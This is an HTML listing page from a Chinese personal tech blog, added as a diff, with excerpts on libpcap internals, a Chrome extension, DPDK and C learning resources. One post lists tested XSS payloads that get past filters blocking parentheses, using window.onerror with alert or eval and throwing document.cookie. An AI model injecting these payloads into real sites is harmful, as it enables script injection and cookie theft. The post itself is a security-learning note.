@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Youfu&#39;s Notes</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Youfu&#39;s Notes">
+<meta property="og:url" content="http://dig404.com/page/8/index.html">
+<meta property="og:site_name" content="Youfu&#39;s Notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Youfu&#39;s Notes">
+  
+    <link rel="alternate" href="/atom.xml" title="Youfu&#39;s Notes" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Youfu&#39;s Notes</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://dig404.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-libpcap-socket" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/19/libpcap-socket/" class="article-date">
+  <time datetime="2014-12-19T14:38:36.000Z" itemprop="datePublished">2014-12-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/libpcap/">libpcap</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/19/libpcap-socket/">libpcap socket 初始化详解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>libpcap使用linux kernel提供的socket套接字来进行数据包的抓取。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure></p>
+<p>参数说明：</p>
+<pre><code>domain是协议族
+type是通信双方使用的socket类型
+protocol是指定socket使用的具体协议
+</code></pre><p>搞过web服务器或者客户端编程的人对这个应该很熟悉：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);</span><br></pre></td></tr></table></figure></p>
+<p>通过这两个socket可以读取linux 内核tcp/ip协议栈处理过的L4层的payload。<br>而要从网卡驱动直接抓取L2层的包，那么需要使用AF_PACKET协议族。<br>man packet 命令可以看到相关的使用方法。<br> <a href="http://man7.org/linux/man-pages/man7/packet.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/packet.7.html</a><br>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/19/libpcap-socket/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/19/libpcap-socket/" data-id="cjchshtuc004iwc6q7emwgyzi" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/libpcap/">libpcap</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-libpcap-init" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/19/libpcap-init/" class="article-date">
+  <time datetime="2014-12-19T14:16:52.000Z" itemprop="datePublished">2014-12-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/19/libpcap-init/">libpcap 初始化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>libpcap 普通抓包主要调用两个函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pcap_t</span> *pcap_open_live(<span class="keyword">const</span> <span class="keyword">char</span> *device, <span class="keyword">int</span> snaplen, <span class="keyword">int</span> promisc, <span class="keyword">int</span> to_ms, <span class="keyword">char</span> *errbuf);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pcap_loop</span><span class="params">(<span class="keyword">pcap_t</span> *p, <span class="keyword">int</span> cnt, pcap_handler callback, u_char *user)</span></span>;</span><br></pre></td></tr></table></figure></p>
+<p>本文主要分析pcap_open_live函数的内部流程，这个函数完成libpcap抓包所需要的数据结构和方法初始化工作。</p>
+<p>具体的函数调用流程以及函数功能分析如下：</p>
+<pre><code>pcap.c : 759行        pcap_open_live
+pcap.c : 399行              pcap_create
+pcap.c: 576行               pcap_set_snaplen / promisc / timeout
+pcap.c: 716行               pcap_activate
+</code></pre><p>首先分析pcap_create()函数的实现，这个函数主要功能是分配了pcap_t，pcap_linux等数据结构内存，初始化了相关的一些回调函数。<br>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/19/libpcap-init/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/19/libpcap-init/" data-id="cjchshtu50042wc6qvi603h3r" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/libpcap/">libpcap</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hack-http-headers" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/17/hack-http-headers/" class="article-date">
+  <time datetime="2014-12-17T08:30:20.000Z" itemprop="datePublished">2014-12-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/17/hack-http-headers/">hack http headers</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>从零到chrome插件正式发布，历时一月有余。靠着不停的F5和F12，终于可以正常使用了，目前仅剩一下扫尾的美化和代码清理工作啦。</p>
+<p>一个月的时间熟悉了chrome扩展开发流程，html+css+javascript基础知识，jquery+bootstrap基本用法。现在对网页的布局，简单效果的各种实现慢慢的有了那么一点点的感觉。不好捉摸，但是隐隐嗅出那么一丝丝的味道来了。</p>
+<p>hack http headers扩展界面参考了live http headers扩展，少量的js和html代码直接就拿过来用了。主要的改变如下：</p>
+<pre><code>&gt; * jquery和bootstrap使用的是截止到目前为止最新的版本，jquery-2.1.1和bootstrap-3.2.0。
+&gt; * 增加了http 头部的修改，以及对显示结果的过滤，添加了request发起的时间。
+&gt; * 修复了live http headers有时request和response不对应的一个bug。
+&gt; * 去掉了live http headers中的raw 功能。
+</code></pre><p>计划中下一版本将会增加的功能：</p>
+<pre><code>&gt; 1. cookies修改过后本地持久化选项。
+&gt; 2. 增加自定义http header功能。(目前版本不能通过注入\r\n的方式增加头部或者设置多个相同头部)。
+&gt; 3. 增加针对单个tab的选项。
+&gt; 4. 增加更多的过滤规则，比如可以根据refer过滤抓取和显示，可以仅仅显示post的请求。
+&gt; 5. 增加对post内容的修改？(这个主要看chrome接口是否会开放出来)
+</code></pre><p>这个项目的github主页如下：<br><a href="https://github.com/chenyoufu/hack-http-headers" target="_blank" rel="noopener">https://github.com/chenyoufu/hack-http-headers</a><br>欢迎小伙伴们提供改进的建议以及合理的需求。</p>
+<p>下载地址：<a href="http://pan.baidu.com/s/1qWJNXV2" target="_blank" rel="noopener">http://pan.baidu.com/s/1qWJNXV2</a></p>
+<p>由于google在chrome稳定版中禁用了chrome官方商店之外的应用，但是要想上传到google chrome商店必须支付5美元的开发者费用，但是google又禁用了大陆用户使用google钱包，搞了半晚上都没有搞定。</p>
+<p>所以建议小伙伴们使用测试版的chrome进行操作。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/17/hack-http-headers/" data-id="cjchshtth002swc6qx1kzycya" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/">chrome</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xss-payload-no-bracket" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/17/xss-payload-no-bracket/" class="article-date">
+  <time datetime="2014-12-17T08:09:34.000Z" itemprop="datePublished">2014-12-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web安全/">web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/17/xss-payload-no-bracket/">XSS绕过()检查</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前两天刚刚提交了一个xss漏洞注册了个乌云帐号，激动了好几个小时。感觉终于入了门了，这几个月的书没白看。<br>对于那些过滤了()的情况，可以用下面的payload来试一下，亲测最新chrome firefox IE：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- IE work --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- chrome unCaught --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- firefox unCauht exception --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"javascript:window.onerror=alert;throw document.cookie"</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome work --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- IE not work --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- firefox not work --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">javascript:window.onerror</span>=<span class="string">eval;throw</span>'=<span class="string">alert\x28</span>"<span class="attr">xss</span>"\<span class="attr">x29</span>';&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome not work --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- IE work --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- firefox not work --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">javascript:window.onerror</span>=<span class="string">eval;throw</span>'<span class="attr">alert</span>\<span class="attr">x28</span>"<span class="attr">xss</span>"\<span class="attr">x29</span>';&gt;</span>xxxxxxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>还有一种是如果能够控制URL属性内容，可以使用data协议来绕过()的检查。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/17/xss-payload-no-bracket/" data-id="cjchshtvz007gwc6q06yzpiw5" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-memory-channel" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/14/memory-channel/" class="article-date">
+  <time datetime="2014-12-14T02:21:00.000Z" itemprop="datePublished">2014-12-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/14/memory-channel/">memory channel</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>dpdk的示例程序中有个选项要求指定memory channel个数，之前没有怎么接触过这个东西，经过一番google后对这个概念有了基本的了解。</p>
+<p>最关心的是linux有没有个命令能够直接输出这个信息，就和lscpu一样，输出cpu的基本信息，很不幸,， 去/sys和/proc下找了一圈发现没有，还按照网上说的安装了一个lshw的小工具，也没有直观的打印出memory channel的信息。<br>直接的既然没有，间接的肯定能得到，只能祭出dmidecode神器了。</p>
+<p>通过man 8 dmidecode可以看到不同类型的硬件的号码，其中有一个是37  Memory Channel，运行命令dmidecode -t 37发现没有任何输出，空欢喜一场。本来以为是操作系统centos6.4比较老，内核版本比较低的原因，于是在最新的centOS 7上试了一把，还是没有信息。</p>
+<p>当然既然dmidecode留了这个interface，后面肯定会通过这个选项直接直观的打印出来的。</p>
+<p>下面是通过dmidecode的Memory信息来间接的查看当前的Channel信息，以及内存处于哪几个Channel上，是否对称。<br>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/14/memory-channel/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/14/memory-channel/" data-id="cjchshtut005fwc6qx1g921to" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dpdk/">dpdk</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-libpcap-mmap" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/14/libpcap-mmap/" class="article-date">
+  <time datetime="2014-12-14T02:10:58.000Z" itemprop="datePublished">2014-12-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/libpcap/">libpcap</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/14/libpcap-mmap/">libpcap mmap 详解1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>libpcap用户层收包的过程主要是调用pcap_loop函数，pcap_loop通过调用read_op回调函数来完成收包。初始化的过程中根据内核提供的支持，read_op的值也有所不同。<br>这里主要关注最快的PACKET V3下的mmap收包方式。在active_mmap中，read_op会被初始化为下面的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_TPACKET3</span></span><br><span class="line">    <span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">    handle-&gt;read_op = pcap_read_linux_mmap_v3;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/14/libpcap-mmap/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/14/libpcap-mmap/" data-id="cjchshtub004fwc6q4qo9e3u8" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/libpcap/">libpcap</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-good-c-source-code" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/14/good-c-source-code/" class="article-date">
+  <time datetime="2014-12-14T01:50:57.000Z" itemprop="datePublished">2014-12-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/14/good-c-source-code/">十个值得关注的c开源项目</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这个文章是在知乎看到别人推荐，觉得说的挺不错摘抄过来的。<br>这个上面的加上上一篇<a href="http://youfu.xyz/2014/12/13/pretty-c-code/" target="_blank" rel="noopener">编程水平进阶之路</a>,我觉得够c程序员吃一壶的了。</p>
+<p>###1. Webbench</p>
+<p>Webbench是一个在linux下使用的非常简单的网站压测工具。它使用fork()模拟多个客户端同时访问我们设定的URL，测试网站在压力下工作的性能，最多可以模拟3万个并发连接去测试网站的负载能力。Webbench使用C语言编写, 代码实在太简洁，源码加起来不到600行。</p>
+<p>下载链接：<a href="http://home.tiscali.cz/~cz210552/webbench.html" target="_blank" rel="noopener">http://home.tiscali.cz/~cz210552/webbench.html</a></p>
+<p>###2. Tinyhttpd</p>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/14/good-c-source-code/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/14/good-c-source-code/" data-id="cjchshttd002jwc6qg0i1ay8i" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-pretty-c-code" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/13/pretty-c-code/" class="article-date">
+  <time datetime="2014-12-13T12:27:11.000Z" itemprop="datePublished">2014-12-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/13/pretty-c-code/">编程水平进阶之路</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>下面这些都是从知乎或者一些其他网站收集的，觉得挺好，接下来的三年一个一个的攻坚，作为C语言进阶，应该读一些不是太大，而且编程风格良好的项目，还应该顺带学习一些底层的东西：</p>
+<p>词法分析语法分析：</p>
+<pre><code>* flex and Bison
+</code></pre><p>网络编程：</p>
+<pre><code>* redis 是单线程异步网络编程的范例，带注释的redis：huangz1990/annotated_redis_source · GitHub
+* nginx 多进程网络编程的巅峰，模块化
+* memcached 虽然是C++，但是C style的，多线程网络编程的巅峰
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/13/pretty-c-code/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/13/pretty-c-code/" data-id="cjchshtve0065wc6qd3s6sr3c" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-network-benchmark" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/13/network-benchmark/" class="article-date">
+  <time datetime="2014-12-13T12:07:03.000Z" itemprop="datePublished">2014-12-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/13/network-benchmark/">网络性能benchmark</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##RFC 2544</p>
+<p>###9.1 Frame sizes to be used on Ethernet<br>64, 128, 256, 512, 1024, 1280, 1518<br>These sizes include the maximum and minimum frame sizes permitted by<br>the Ethernet standard and a selection of sizes between these extremes<br>with a finer granularity for the smaller frame sizes and higher frame<br>rates.<br>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/13/network-benchmark/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/13/network-benchmark/" data-id="cjchshtuz005owc6qmrmd7fsw" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/driver/">driver</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xv6-start" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/12/10/xv6-start/" class="article-date">
+  <time datetime="2014-12-10T05:48:00.000Z" itemprop="datePublished">2014-12-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/编程/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/12/10/xv6-start/">centOS6.4搭建xv6学习环境</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前两天在centos 6.4服务器上折腾了一会儿xv6，xv6是MIT教学用的操作系统内核，总共6000多行代码，操作系统该有的基本都有了。<br>跟着MIT给出的课程表一步一步来，折腾完后就可以看linux内核了。<br>课程表：<a href="http://pdos.csail.mit.edu/6.828/2014/schedule.html" target="_blank" rel="noopener">http://pdos.csail.mit.edu/6.828/2014/schedule.html</a><br>xv6主页：<a href="http://pdos.csail.mit.edu/6.828/2014/xv6.html" target="_blank" rel="noopener">http://pdos.csail.mit.edu/6.828/2014/xv6.html</a><br>相关tools：<a href="http://pdos.csail.mit.edu/6.828/2014/tools.html" target="_blank" rel="noopener">http://pdos.csail.mit.edu/6.828/2014/tools.html</a><br>说白了，现在就是在还大学欠下的债。<br>首先要安装qemu，能让xv6在上面运行起来。<br>
+        
+          <p class="article-more-link">
+            <a href="/2014/12/10/xv6-start/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dig404.com/2014/12/10/xv6-start/" data-id="cjchshtw4007nwc6qvpupodh0" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xv6/">xv6</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/7/">&laquo; zurück</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/">weiter &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorien</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/leetcode/">leetcode</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/libpcap/">libpcap</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/吉他/">吉他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/生活/">生活</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELK/">ELK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book/">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/">chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dota/">dota</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dpdk/">dpdk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/driver/">driver</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/elk/">elk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/">go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/">kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libpcap/">libpcap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lua/">lua</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nfc/">nfc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openresty/">openresty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/performance/">performance</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plan/">plan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-elk/">python, elk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-生活/">python, 生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rsyslog/">rsyslog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spark/">spark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vpn/">vpn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xv6/">xv6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/一图胜千言/">一图胜千言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内存/">内存</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/吉他谱/">吉他谱</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生活/">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编译原理/">编译原理</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ELK/" style="font-size: 12.86px;">ELK</a> <a href="/tags/book/" style="font-size: 12.86px;">book</a> <a href="/tags/chrome/" style="font-size: 11.43px;">chrome</a> <a href="/tags/dota/" style="font-size: 10px;">dota</a> <a href="/tags/dpdk/" style="font-size: 15.71px;">dpdk</a> <a href="/tags/driver/" style="font-size: 11.43px;">driver</a> <a href="/tags/elk/" style="font-size: 10px;">elk</a> <a href="/tags/go/" style="font-size: 11.43px;">go</a> <a href="/tags/kafka/" style="font-size: 10px;">kafka</a> <a href="/tags/leetcode/" style="font-size: 17.14px;">leetcode</a> <a href="/tags/libpcap/" style="font-size: 20px;">libpcap</a> <a href="/tags/linux/" style="font-size: 18.57px;">linux</a> <a href="/tags/lua/" style="font-size: 10px;">lua</a> <a href="/tags/mac/" style="font-size: 10px;">mac</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/nfc/" style="font-size: 10px;">nfc</a> <a href="/tags/openresty/" style="font-size: 10px;">openresty</a> <a href="/tags/performance/" style="font-size: 12.86px;">performance</a> <a href="/tags/plan/" style="font-size: 10px;">plan</a> <a href="/tags/python/" style="font-size: 14.29px;">python</a> <a href="/tags/python-elk/" style="font-size: 10px;">python, elk</a> <a href="/tags/python-生活/" style="font-size: 10px;">python, 生活</a> <a href="/tags/rsyslog/" style="font-size: 10px;">rsyslog</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/spark/" style="font-size: 15.71px;">spark</a> <a href="/tags/vpn/" style="font-size: 10px;">vpn</a> <a href="/tags/xss/" style="font-size: 11.43px;">xss</a> <a href="/tags/xv6/" style="font-size: 10px;">xv6</a> <a href="/tags/一图胜千言/" style="font-size: 10px;">一图胜千言</a> 